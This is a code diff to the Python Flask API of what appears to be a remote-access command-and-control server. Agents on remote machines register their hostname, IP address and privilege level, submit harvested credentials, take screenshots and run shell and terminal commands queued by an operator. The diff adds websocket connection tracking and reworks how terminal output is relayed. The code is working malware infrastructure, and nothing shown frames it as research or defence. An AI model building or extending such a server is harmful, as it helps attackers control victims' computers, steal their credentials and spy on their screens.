@@ -36,17 +36,27 @@ def init_api_routes(app, socketio):
             conn = sqlite3.connect(CONFIG.database)
             c = conn.cursor()
             
+            task_data = data.get('task_data', {})
+            
             c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                      (None, 
                       data['agent_id'], 
                       data['task_type'], 
-                      json.dumps(data.get('task_data', {})),
+                      json.dumps(task_data),
                       'pending', 
                       datetime.now().isoformat().split('.')[0].replace('T', ' '), 
                       None))
             
             conn.commit()
             task_id = c.lastrowid
+            
+            # Update agent's ws_connected status if this is a websocket task
+            if data['task_type'] == 'websocket':
+                ws_connected = 1 if data.get('action') == 'start' else 0
+                c.execute("UPDATE agents SET ws_connected=? WHERE id=?",
+                         (ws_connected, data['agent_id']))
+                conn.commit()
+            
             conn.close()
             
             socketio.emit('new_task', {
@@ -84,15 +94,21 @@ def init_api_routes(app, socketio):
             conn.execute("PRAGMA journal_mode=WAL")
             c = conn.cursor()
 
+            # Check if agent exists and get current ws_connected status
+            c.execute("SELECT ws_connected FROM agents WHERE id=?", (data['agent_id'],))
+            agent = c.fetchone()
+            current_ws_status = agent[0] if agent else 0
+
             c.execute('''INSERT OR REPLACE INTO agents 
-                        VALUES (?, ?, ?, ?, ?, ?, ?)''',
+                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                      (data['agent_id'],
                       data.get('hostname', 'UNKNOWN'),
                       data.get('ip', '0.0.0.0'),
                       data.get('os', 'UNKNOWN'),
                       datetime.now().isoformat().split('.')[0].replace('T', ' '),
                       'online',
-                      data.get('privilege', 'user')))
+                      data.get('privilege', 'user'),
+                      current_ws_status))
 
             if 'credentials' in data:
                 creds = data['credentials']
@@ -178,24 +194,16 @@ def init_api_routes(app, socketio):
             conn = sqlite3.connect(CONFIG.database)
             c = conn.cursor()
             
-            # First get the screenshot info
             c.execute("SELECT id, agent_id FROM screenshots WHERE id = ?", (screenshot_id,))
             screenshot = c.fetchone()
             
             if not screenshot:
                 return jsonify({"status": "error", "message": "Screenshot not found"}), 404
                 
-            # Delete from database
             c.execute("DELETE FROM screenshots WHERE id = ?", (screenshot_id,))
             
-            # Delete the file if it exists
-            #file_path = screenshot[2]
-            #if os.path.exists(file_path):
-            #    os.remove(file_path)
-                
             conn.commit()
             
-            # Notify via WebSocket
             socketio.emit('screenshot_deleted', {
                 'screenshot_id': screenshot_id,
                 'agent_id': screenshot[1]
@@ -221,34 +229,38 @@ def init_api_routes(app, socketio):
             conn.execute("PRAGMA journal_mode=WAL")
             c = conn.cursor()
             
+            # Update task status
             c.execute('''UPDATE tasks SET status='completed', completed_at=?
-                         WHERE id=?''', (datetime.now().isoformat().split('.')[0].replace('T', ' '), data['task_id']))
+                        WHERE id=?''', 
+                    (datetime.now().isoformat().split('.')[0].replace('T', ' '), 
+                    data['task_id']))
             
-            c.execute("SELECT task_type, task_data FROM tasks WHERE id=?", (data['task_id'],))
-            task = c.fetchone()
-            if task:
-                task_type = task[0]
-                task_data = json.loads(task[1])
-                
-                if task_type == 'shell' and task_data.get('terminal', False):
-                    # Add sequence ID to prevent duplicates
-                    socketio.emit('terminal_output', {
-                        'agent_id': data['agent_id'],
-                        'command': task_data.get('cmd', ''),
-                        'output': data['result'].get('output', 'No output'),
-                        'error': data['result'].get('error', ''),
-                        'task_id': data['task_id'],
-                        'seq_id': task_data.get('seq_id', 0)
-                    }, room=f"terminal_{data['agent_id']}")
+            # Handle WebSocket connection status
+            if data['task_type'] == 'websocket':
+                ws_connected = 1 if (data['result'].get('status') == 'success' and 
+                                'connected' in data['result'].get('message', '').lower()) else 0
+                c.execute('''UPDATE agents SET ws_connected=? WHERE id=?''',
+                        (ws_connected, data['agent_id']))
             
+            # Handle terminal output
+            if data['task_type'] == 'terminal' and data['result'].get('terminal', False):
+                socketio.emit('terminal_output', {
+                    'agent_id': data['agent_id'],
+                    'command': data['result'].get('command', ''),
+                    'output': data['result'].get('output', ''),
+                    'error': data['result'].get('error', ''),
+                    'current_dir': data['result'].get('current_dir', ''),
+                    'task_id': data['task_id']
+                }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
+
             if data['task_type'] == 'screenshot' and 'screenshot' in data['result']:
                 try:
                     image_data = base64.b64decode(data['result']['screenshot'])
                     c.execute('''INSERT INTO screenshots 
                                 VALUES (?, ?, ?, ?)''',
-                             (None, data['agent_id'], 
-                              image_data,
-                              datetime.now().isoformat().split('.')[0].replace('T', ' ')))
+                                (None, data['agent_id'], 
+                                image_data,
+                                datetime.now().isoformat().split('.')[0].replace('T', ' ')))
                 except Exception as e:
                     pass
             
@@ -279,3 +291,7 @@ def init_api_routes(app, socketio):
                 conn.rollback()
                 conn.close()
             return jsonify({'status': 'error', 'message': str(e)}), 500
+            
+          
+            
+         
